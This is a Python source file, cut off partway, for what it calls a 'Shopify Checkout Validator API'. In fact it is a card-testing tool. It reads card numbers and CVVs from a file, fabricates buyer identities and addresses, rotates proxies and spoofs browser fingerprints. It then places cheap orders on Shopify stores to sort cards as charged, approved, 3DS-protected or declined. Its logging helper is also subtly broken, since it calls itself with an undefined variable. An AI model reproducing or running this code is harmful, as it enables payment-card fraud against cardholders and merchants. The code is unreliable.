"""
Shopify Checkout Validator API — VPS Edition (Rebuilt & Fixed)
High-performance, fully async, production-ready.
Compatible with Python 3.9+ (Fixed F-string Syntax Errors).
"""
import asyncio
import copy
import logging
import os
import random
import re
import time
from collections import OrderedDict
from contextlib import asynccontextmanager
from typing import Any, Optional
from urllib.parse import urlparse

# Third-party
try:
    from curl_cffi.requests import AsyncSession, RequestsError
except ImportError:
    raise RuntimeError("curl_cffi not found. Install via: pip install curl-cffi")

import orjson
import uvicorn
from fastapi import FastAPI, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
import aiofiles
import datetime

# ---------------------------------------------------------------------------
# Configuration from environment
# ---------------------------------------------------------------------------
PORT             = int(os.environ.get("PORT", 8080))
WORKERS          = int(os.environ.get("WORKERS", 1)) # Async I/O benefits from fewer workers usually
CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
MAX_PRICE        = float(os.environ.get("MAX_PRICE", 500.0))
SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 15))
POOL_SIZE        = int(os.environ.get("POOL_SIZE", 500))
CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 8))
REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 35))
CACHE_TTL        = float(os.environ.get("CACHE_TTL", 300))
LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()
LOG_FILE         = os.environ.get("LOG_FILE", "requests.txt")

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.WARNING),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("shopify_validator")

# ---------------------------------------------------------------------------
# Static Data & Helpers
# ---------------------------------------------------------------------------
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "ZAR": "ZA", "BRL": "BR",
    "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "JPY": "JP", "KRW": "KR",
}

ADDRESS_BOOK: dict[str, dict] = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2124157586"},
    "CA": {"address1": "88 Queen St W", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Khalifa Tower", "city": "Dubai", "postalCode": "00000", "zoneCode": "DU", "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "88 Nathan Road", "city": "Kowloon", "postalCode": "000000", "zoneCode": "KLN", "countryCode": "HK", "phone": "55555555"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schwyz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Unter den Linden 1", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "3012345678"},
    "FR": {"address1": "1 Rue de Rivoli", "city": "Paris", "postalCode": "75001", "zoneCode": "IDF", "countryCode": "FR", "phone": "142123456"},
    "NZ": {"address1": "1 Queen Street", "city": "Auckland", "postalCode": "1010", "zoneCode": "AUK", "countryCode": "NZ", "phone": "98765432"},
    "SG": {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616", "zoneCode": "01", "countryCode": "SG", "phone": "61234567"},
    "JP": {"address1": "1-1 Marunouchi", "city": "Tokyo", "postalCode": "100-0005", "zoneCode": "13", "countryCode": "JP", "phone": "312345678"},
    "BR": {"address1": "Av. Paulista 1000", "city": "Sao Paulo", "postalCode": "01310-100", "zoneCode": "SP", "countryCode": "BR", "phone": "1112345678"},
    "MX": {"address1": "Paseo de la Reforma 1", "city": "Mexico City", "postalCode": "06600", "zoneCode": "CMX", "countryCode": "MX", "phone": "5512345678"},
    "SE": {"address1": "Drottninggatan 1", "city": "Stockholm", "postalCode": "11151", "zoneCode": "AB", "countryCode": "SE", "phone": "812345678"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2124157586"},
}

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas",
               "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Susan", "Jessica", "Sarah", "Karen",
               "Emily", "Ashley", "Daniel", "Matthew", "Andrew", "Joshua", "Christopher", "Ryan", "Tyler"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez",
              "Martinez", "Hernandez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Lee",
              "White", "Harris", "Martin", "Thompson", "Turner", "Mitchell", "Campbell", "Roberts", "Evans"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com", "icloud.com", "hotmail.com",
                 "live.com", "mail.com", "aol.com"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
]

# ---------------------------------------------------------------------------
# Global State
# ---------------------------------------------------------------------------
_shared_session: Optional['LoggedSession'] = None
_site_semaphores: 'LRUCacheSemaphores' = None # Initialized in lifespan
_product_cache: dict[str, dict] = {}
_product_locks: dict[str, asyncio.Lock] = {}
_cards_cache: list[dict] = []
_cards_loaded_at: float = 0.0
_stats: dict[str, int] = {}

class LRUCacheSemaphores:
    """Manages a bounded set of asyncio.Semaphore objects keyed by hostname."""
    def __init__(self, max_size: int = 1000):
        self.max_size = max_size
        self.cache: OrderedDict[str, asyncio.Semaphore] = OrderedDict()
        self.lock = asyncio.Lock()

    async def get(self, key: str) -> asyncio.Semaphore:
        async with self.lock:
            if key in self.cache:
                # Move to end (most recently used)
                self.cache.move_to_end(key)
                return self.cache[key]
            
            # Create new
            sem = asyncio.Semaphore(SITE_CONCURRENCY)
            self.cache[key] = sem
            
            # Evict oldest if over capacity
            if len(self.cache) > self.max_size:
                self.cache.popitem(last=False)
                
            return sem

# ---------------------------------------------------------------------------
# Logging Infrastructure
# ---------------------------------------------------------------------------
_log_lock = asyncio.Lock()
_SEP = "=" * 70

async def _write_log(entry: str) -> None:
    try:
        async with _log_lock:
            async with aiofiles.open(LOG_FILE, mode="a", encoding="utf-8") as f:
                await f.write(entry + "\n")
    except Exception as ex:
        log.warning("Failed to write request log: %s", ex)

def _truncate(text: str, limit: int = 2000) -> str:
    if len(text) > limit:
        return text[:limit] + f"\n... [truncated {len(text) - limit} chars]"
    return text

async def _log_incoming(request: Request, response_body: bytes, status_code: int, elapsed_ms: float) -> None:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    client = request.client.host if request.client else "unknown"
    body_str = response_body.decode("utf-8", errors="replace")
    
    entry = (
        f"{_SEP}\n"
        f"[{now}] INCOMING {request.method} {request.url}\n"
        f"Client : {client}\n"
        f"Status : {status_code} ({elapsed_ms:.1f}ms)\n"
        f"Body   :\n{_truncate(body_str)}\n"
        f"{_SEP}"
    )
    asyncio.create_task(_write_log(entry))

async def _log_outgoing(method: str, url: str, req_body, status_code: int, resp_text: str, elapsed_ms: float, label: str = "") -> None:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    rb = ""
    if isinstance(req_body, bytes):
        rb = req_body.decode("utf-8", errors="replace")
    elif req_body is not None:
        rb = str(req_body)
        
    entry = (
        f"{_SEP}\n"
        f"[{now}] OUTGOING {method} {url} [{label}]\n"
        f"Status : {status_code} ({elapsed_ms:.1f}ms)\n"
        f"Req    :\n{_truncate(rb, 1000)}\n"
        f"Resp   :\n{_truncate(resp_text, 2000)}\n"
        f"{_SEP}"
    )
    asyncio.create_task(_log_outgoing(method.upper(), url, req_body, resp.status_code, resp_text, elapsed, label))
    return resp

# ---------------------------------------------------------------------------
# Session Wrapper
# ---------------------------------------------------------------------------
class LoggedSession:
    def __init__(self, session: AsyncSession):
        self._s = session

    async def _call(self, method: str, url: str, label: str = "", data=None, json=None, **kwargs):
        t0 = time.time()
        req_body = data if data is not None else (orjson.dumps(json) if json is not None else None)
        try:
            if json is not None:
                resp = await getattr(self._s, method.lower())(url, json=json, **kwargs)
            elif data is not None:
                resp = await getattr(self._s, method.lower())(url, data=data, **kwargs)
            else:
                resp = await getattr(self._s, method.lower())(url, **kwargs)
            
            elapsed = (time.time() - t0) * 1000
            try:
                resp_text = resp.text
            except Exception:
                resp_text = "<unreadable>"
            
            # Log outgoing
            asyncio.create_task(_log_outgoing(method.upper(), url, req_body, resp.status_code, resp_text, elapsed, label))
            return resp
        except Exception as exc:
            elapsed = (time.time() - t0) * 1000
            asyncio.create_task(_log_outgoing(method.upper(), url, req_body, 0, f"EXCEPTION: {type(exc).__name__}: {exc}", elapsed, label))
            raise

    async def get(self, url: str, label: str = "", **kwargs):
        return await self._call("GET", url, label=label, **kwargs)

    async def post(self, url: str, label: str = "", data=None, json=None, **kwargs):
        return await self._call("POST", url, label=label, data=data, json=json, **kwargs)

    async def close(self):
        if hasattr(self._s, 'close'):
            res = self._s.close()
            if asyncio.iscoroutine(res):
                await res
    
    def __getattr__(self, name):
        return getattr(self._s, name)

# ---------------------------------------------------------------------------
# GraphQL Definitions (Concatenated to avoid f-string brace errors in Py3.10)
# ---------------------------------------------------------------------------

_PROPOSAL_VARS = (
    "$sessionInput:SessionTokenInput!, $delivery:DeliveryTermsInput,"
    "$discounts:DiscountTermsInput, $payment:PaymentTermInput,"
    "$merchandise:MerchandiseTermInput, $buyerIdentity:BuyerIdentityTermInput,"
    "$taxes:TaxTermInput, $checkpointData:String,$queueToken:String, "
    "$reduction:ReductionInput, $availableRedeemables:AvailableRedeemablesInput, "
    "$tip:TipTermInput,$note:NoteInput, $localizationExtension:LocalizationExtensionInput, "
    "$nonNegotiableTerms:NonNegotiableTermsInput, $scriptFingerprint:ScriptFingerprintInput, "
    "$transformerFingerprintV2:String, $optionalDuties:OptionalDutiesInput,"
    "$attribution:AttributionInput, $captcha:CaptchaInput,$poNumber:String, "
    "$saleAttributions:SaleAttributionsInput, $alternativePaymentCurrency:AlternativePaymentCurrencyInput, "
    "$deliveryExpectations:DeliveryExpectationTermsInput, $memberships:MembershipsInput, "
    "$cartMetafields:[CartMetafieldOperationInput!] "
)

_PROPOSAL_ARGS = (
    "delivery:$delivery,discounts:$discounts,payment:$payment, "
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes, "
    "reduction:$reduction,availableRedeemables:$availableRedeemables, "
    "tip:$tip,note:$note,poNumber:$poNumber, nonNegotiableTerms:$nonNegotiableTerms, "
    "localizationExtension:$localizationExtension, scriptFingerprint:$scriptFingerprint, "
    "transformerFingerprintV2:$transformerFingerprintV2, optionalDuties:$optionalDuties,"
    "attribution:$attribution, captcha:$captcha,saleAttributions:$saleAttributions, "
    "alternativePaymentCurrency:$alternativePaymentCurrency, deliveryExpectations:$deliveryExpectations, "
    "memberships:$memberships, cartMetafields:$cartMetafields "
)

_SELLER_PROPOSAL_FIELDS = (
    "sellerProposal{ runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}} "
    "total{...on MoneyValueConstraint{value{amount currencyCode}}} "
    "delivery{__typename ...on FilledDeliveryTerms{deliveryLines{ "
    "availableDeliveryStrategies{__typename ...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}} "
    "estimatedTimeInTransit{...on IntValueConstraint{value}}}} "
    "selectedDeliveryStrategy{__typename ...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}} "
    "tax{__typename ...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}} "
    "payment{__typename ...on FilledPaymentTerms{availablePaymentLines{ "
    "paymentMethod{__typename ...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName} "
    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}} __typename} "
)

_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{ "
    "...on ProcessedReceipt{id token __typename} "
    "...on ProcessingReceipt{id pollDelay __typename} "
    "...on WaitingReceipt{id pollDelay __typename} "
    "...on ActionRequiredReceipt{id action{ "
    "...on CompletePaymentChallenge{offsiteRedirect url __typename} "
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename} "
    "__typename}timeout{millisecondsRemaining __typename}__typename} "
    "...on FailedReceipt{id processingError{ "
    "...on InventoryClaimFailure{__typename} "
    "...on InventoryReservationFailure{__typename} "
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename} "
    "...on PaymentFailed{code messageUntranslated __typename} "
    "__typename}__typename}__typename} "
)

# Construct Queries using + concatenation
QUERY_PROPOSAL_SHIPPING = (
    "query Proposal(" + _PROPOSAL_VARS + ") {"
    "session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS +
    "}, checkpointData:$checkpointData,queueToken:$queueToken}) {"
    "__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS +
    "} "
    "...on CheckpointDenied{redirectUrl} "
    "...on Throttled{pollAfter queueToken pollUrl} "
    "...on TooManyRequests{__typename} "
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}}"
)

QUERY_PROPOSAL_DELIVERY = (
    "query Proposal(" + _PROPOSAL_VARS + ") {"
    "session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS +
    "}, checkpointData:$checkpointData,queueToken:$queueToken}) {"
    "__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS +
    "} "
    "...on CheckpointDenied{redirectUrl} "
    "...on Throttled{pollAfter queueToken pollUrl} "
    "...on TooManyRequests{__typename} "
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}} "
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
    + _RECEIPT_FRAGMENT
)

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!, "
    "$metafields:[MetafieldInput!], $postPurchaseInquiryResult:PostPurchaseInquiryResultCode, "
    "$analytics:AnalyticsInput) {"
    "submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields "
    "postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails}__typename} "
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}__typename} "
    "...on SubmitFailed{reason __typename} "
    "...on SubmitRejected{errors{code localizedMessage nonLocalizedMessage __typename}__typename} "
    "...on Throttled{pollAfter pollUrl queueToken __typename} "
    "...on CheckpointDenied{redirectUrl __typename} "
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}__typename} "
    "...on TooManyRequests{__typename} "
    "...on TooManyAttempts{__typename} __typename}}"
    + _RECEIPT_FRAGMENT
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
    "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
    "...ReceiptDetails __typename}}"
    + _RECEIPT_FRAGMENT
)

# ---------------------------------------------------------------------------
# Utility Functions
# ---------------------------------------------------------------------------
def _reload_cards() -> None:
    global _cards_cache, _cards_loaded_at
    _cards_cache = _load_cards_from_file()
    _cards_loaded_at = time.time()

def _load_cards_from_file() -> list[dict]:
    cards = []
    if not os.path.exists(CARDS_FILE):
        return cards
    with open(CARDS_FILE, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            card = _parse_card(line.strip())
            if card:
                cards.append(card)
    return cards

def _get_cards() -> list[dict]:
    global _cards_cache, _cards_loaded_at
    if not _cards_cache or (time.time() - _cards_loaded_at) > 120:
        _reload_cards()
    return _cards_cache

def _parse_card(raw: str) -> Optional[dict]:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    parts = raw.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc_num, mon, yr, cvv = [p.strip() for p in parts]
    if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
        return None
    if len(yr) == 4:
        yr = yr[2:]
    if len(yr) != 2:
        return None
    if not 1 <= int(mon) <= 12:
        return None
    if len(cc_num) < 13 or len(cc_num) > 19:
        return None
    return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}

def _parse_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    s = raw.strip()
    if "://" in s:
        return s
    parts = s.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None

def _pick_address(url: str, currency: Optional[str] = None) -> dict:
    netloc = urlparse(url).netloc.split(":")[0]
    tld = netloc.split(".")[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
    if currency:
        cc = C2C.get(currency.upper())
        if cc and cc in ADDRESS_BOOK:
            return ADDRESS_BOOK[cc]
    return ADDRESS_BOOK["DEFAULT"]

def _random_identity() -> tuple[str, str, str]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email

def _extract(text: str, start: str, end: str) -> Optional[str]:
    idx = text.find(start)
    if idx == -1:
        return None
    sub = text[idx + len(start):]
    end_idx = sub.find(end)
    if end_idx == -1:
        return None
    val = sub[:end_idx]
    return val if val else None

def _extract_sst(text: str, headers: dict) -> Optional[str]:
    for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
        if key in headers:
            return headers[key]
    patterns = [
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"', '"'),
        ('"sessionToken":"', '"'),
        ('data-session-token="', '"'),
    ]
    for s, e in patterns:
        val = _extract(text, s, e)
        if val and len(val) > 10:
            return val
    return None

def _normalize_response(raw: Optional[str]) -> str:
    if not raw:
        return "CARD_DECLINED"
    msg = str(raw).upper()
    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED")):
        return "ORDER_PLACED"
    if any(k in msg for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP", "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE", "AUTHENTICATION_REQUIRED", "THREEDSSECURE", "THREE_D_SECURE", "3D_SECURE", "SCA_REQUIRED")):
        return "3DS_REQUIRED"
    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC", "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
        return "INVALID_CVC"
    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "DO_NOT_HONOR", "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
        return "INSUFFICIENT_FUNDS"
    if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION")):
        return "EXPIRED_CARD"
    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD", "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT", "CARD_NOT_SUPPORTED")):
        return "INVALID_CARD"
    if any(k in msg for k in ("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION", "CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER", "GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED", "NOT_PERMITTED", "SERVICE_NOT_ALLOWED", "TRY_AGAIN_LATER", "LIMIT_EXCEEDED")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
        return "CAPTCHA_REQUIRED"
    return "CARD_DECLINED"

def _parse_gql_errors(errors: list) -> str:
    for err in errors:
        for field in ("code", "nonLocalizedMessage", "localizedMessage", "message", "messageUntranslated"):
            raw = str(err.get(field) or "")
            if not raw:
                continue
            norm = _normalize_response(raw)
            if norm != "CARD_DECLINED":
                return norm
            upper = raw.upper()
            if any(k in upper for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
                return "CAPTCHA_REQUIRED"
            if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "EXCEEDS_BALANCE")):
                return "INSUFFICIENT_FUNDS"
            if any(k in upper for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "CVV_FAILURE", "INCORRECT_CVC")):
                return "INVALID_CVC"
            if any(k in upper for k in ("SESSION_EXPIRED", "SESSION_INVALID", "TOKEN_EXPIRED", "INVALID_SESSION")):
                return "SESSION_EXPIRED"
            if any(k in upper for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED", "CUSTOMER_DISABLED")):
                return "SITE_REQUIRES_LOGIN"
            if any(k in upper for k in ("OUT_OF_STOCK", "SOLD_OUT", "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
                return "NO_PRODUCT"
            if any(k in upper for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS", "RATE_LIMITED", "RETRY_LATER")):
                return "THROTTLED"
    return "GRAPHQL_ERROR"

def _make_session(proxy_str: Optional[str]) -> tuple[LoggedSession, bool]:
    proxy = _parse_proxy(proxy_str) if proxy_str else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    # Note: curl_cffi handles impersonation internally. 
    # We create a new session per request here to allow proxy switching easily.
    # For extreme scale, a shared pool with dynamic proxy injection is needed, 
    # but this balances simplicity and functionality for validation tools.
    session = LoggedSession(AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT, proxies=proxies))
    return session, True

# ---------------------------------------------------------------------------
# Core Logic
# ---------------------------------------------------------------------------
async def _fetch_products(base_url: str, proxy_str: Optional[str] = None, max_price: float = MAX_PRICE) -> tuple[Optional[dict], list[dict], Optional[str]]:
    if not base_url.startswith("http"):
        base_url = "https://" + base_url
    hostname = urlparse(base_url).netloc
    now = time.time()

    # Check Cache
    cached = _product_cache.get(hostname)
    if cached and (now - cached["ts"]) < CACHE_TTL:
        return cached.get("product"), cached.get("candidates", []), cached.get("err")

    # Lock to prevent thundering herd on cache miss
    if hostname not in _product_locks:
        _product_locks[hostname] = asyncio.Lock()
    
    async with _product_locks[hostname]:
        # Double-check after acquiring lock
        cached = _product_cache.get(hostname)
        if cached and (time.time() - cached["ts"]) < CACHE_TTL:
            return cached.get("product"), cached.get("candidates", []), cached.get("err")

        session, owned = _make_session(proxy_str)
        try:
            all_variants: list[dict] = []
            urls_to_try = [
                f"{base_url}/products.json?limit=250&sort_by=price-ascending",
                f"{base_url}/products.json?limit=250",
            ]
            for url in urls_to_try:
                try:
                    resp = await session.get(url, allow_redirects=True)
                    if resp.status_code == 200:
                        data = orjson.loads(resp.content)
                        products = data.get("products", [])
                        if products:
                            all_variants = products
                            break
                    elif resp.status_code in (429, 430):
                        err = "THROTTLED"
                        _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": time.time()}
                        return None, [], err
                except Exception:
                    continue

            candidates: list[dict] = []
            best: Optional[dict] = None
            best_price = float("inf")

            if not all_variants:
                # Fallback: Sitemap scraping (slower, less reliable)
                try:
                    sitemap_url = f"{base_url}/sitemap_products_1.xml"
                    smap_resp = await session.get(sitemap_url, allow_redirects=True)
                    if smap_resp.status_code == 200:
                        import xml.etree.ElementTree as ET
                        root = ET.fromstring(smap_resp.content)
                        urls = []
                        for child in root:
                            if child.tag.endswith('url'):
                                for loc in child:
                                    if loc.tag.endswith('loc'):
                                        urls.append(loc.text)
                        if urls:
                            sample_urls = random.sample(urls, min(10, len(urls))) # Limit samples
                            for purl in sample_urls:
                                try:
                                    p_resp = await session.get(purl, allow_redirects=True)
                                    matches = re.finditer(r'"id":(\d+).*?"inStock":true.*?,"price":([\d.]+)', p_resp.text)
                                    for m in matches:
                                        variant_id = m.group(1)
                                        price = float(m.group(2))
                                        if 0 < price <= max_price:
                                            entry = {"site": base_url, "price": f"{price:.2f}", "price_f": price, "variant_id": str(variant_id), "title": "Product", "handle": ""}
                                            candidates.append(entry)
                                            if price < best_price:
                                                best_price = price
                                                best = entry
                                except Exception:
                                    pass
                except Exception:
                    pass
                
                if not candidates:
                    err = "No products found"
                    _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": time.time()}
                    return None, [], err
            else:
                for product in all_variants:
                    for variant in product.get("variants", []):
                        try:
                            avail = variant.get("available", True)
                            if avail is False:
                                continue
                            price = float(variant.get("price") or "0")
                        except (ValueError, TypeError):
                            continue
                        if price <= 0 or price > max_price:
                            continue
                        entry = {"site": base_url, "price": f"{price:.2f}", "price_f": price, "variant_id": str(variant["id"]), "title": product.get("title", "Product"), "handle": product.get("handle", "")}
                        candidates.append(entry)
                        if price < best_price:
                            best_price = price
                            best = entry

            if not best:
                err = f"No products under ${max_price:.2f}"
                _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": time.time()}
                return None, [], err

            _product_cache[hostname] = {"product": best, "candidates": candidates, "err": None, "ts": time.time()}
            return best, candidates, None
        
        except (asyncio.TimeoutError, RequestsError):
            err = "Timeout"
            return None, [], err
        except Exception as ex:
            return None, [], str(ex)
        finally:
            if owned:
                await session.close()

async def validate_card(cc: str, month: str, year: str, cvv: str, site_url: str, variant_id: Optional[str] = None, proxy_str: Optional[str] = None, max_price: Optional[float] = None) -> dict:
    t0 = time.time()
    gateway = "UNKNOWN"
    price = "0.00"
    currency = "USD"
    product_title = ""
    effective_max_price = max_price if max_price is not None else MAX_PRICE
    
    site_url = site_url.strip()
    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    hostname = urlparse(ourl).netloc
    proxy = _parse_proxy(proxy_str)
    ua = random.choice(USER_AGENTS)

    def _r(response: str, charged: str = "False", approved: str = "False") -> dict:
        return {
            "Response": response,
            "CC": f"{cc}|{month}|{year}|{cvv}",
            "Product": product_title,
            "Price": price,
            "Gate": gateway,
            "Site": ourl,
            "Charged": charged,
            "Approved": approved,
            "Time": f"{round(time.time() - t0, 2)}s",
        }

    sem = await _site_semaphores.get(hostname)
    session, owned = _make_session(proxy_str)
    
    async with sem:
        try:
            addr = _pick_address(ourl)
            country_code = addr["countryCode"]
            first, last, email = _random_identity()
            phone = addr["phone"]
            street = addr["address1"]
            city = addr["city"]
            state = addr["zoneCode"]
            s_zip = addr["postalCode"]

            # 0. Fetch Product
            best, all_candidates, err = await _fetch_products(ourl, proxy_str)
            if all_candidates:
                candidates_under_max = [c for c in all_candidates if float(c.get("price", 999999)) <= effective_max_price]
            else:
                candidates_under_max = [best] if (best and float(best.get("price", 999999)) <= effective_max_price) else []
            
            if not variant_id:
                if not candidates_under_max:
                    return _r(f"NO_PRODUCT: {err or f'No products under ${effective_max_price:.2f}'}")
                chosen_prod = random.choice(candidates_under_max)
                variant_id = chosen_prod["variant_id"]
                price = chosen_prod["price"]
                product_title = chosen_prod.get("title", "")
            else:
                matched = next((c for c in (all_candidates or []) if str(c.get("variant_id")) == str(variant_id)), None)
                if not matched:
                    return _r(f"PRICE_OVER_MAX: variant {variant_id} not found or too expensive")
                price = matched["price"]
                product_title = matched.get("title", "")

            if float(price) > effective_max_price:
                return _r(f"PRICE_OVER_MAX: base price ${price} > ${effective_max_price:.2f}")

            base_headers = {
                "User-Agent": ua,
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
                "Origin": ourl,
                "Referer": f"{ourl}/",
                "sec-ch-ua": '"Chromium";v="136", "Not-A.Brand";v="24"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            }

            # 1. Add to Cart
            cart_added = False
            for payload, ct in [(f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"), (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}), "application/json")]:
                try:
                    r = await session.post(f"{ourl}/cart/add.js", data=payload, headers={**base_headers, "Content-Type": ct, "Accept": "application/json"})
                    if r.status_code == 200:
                        cart_added = True
                        break
                except Exception:
                    continue
            if not cart_added:
                return _r("CART_FAILED")

            # 2. Get Checkout Page
            try:
